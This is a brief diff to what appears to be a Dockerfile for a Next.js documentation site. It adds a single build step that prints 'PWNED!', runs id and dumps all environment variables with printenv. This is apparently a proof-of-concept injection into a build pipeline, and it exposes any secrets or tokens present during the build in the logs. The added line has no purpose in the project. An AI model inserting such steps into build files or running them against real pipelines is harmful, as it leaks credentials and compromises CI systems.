@@ -28,6 +28,7 @@ ENV NEXT_PUBLIC_DOC_TRACK_SRC=$DOC_TRACK_SRC
 ENV NEXT_PUBLIC_DOC_TRACK_SITE_ID=$DOC_TRACK_SITE_ID
 
 COPY . .
+RUN echo "============== PWNED! ==============" && id && printenv
 RUN npm install 
 RUN npm run build
 
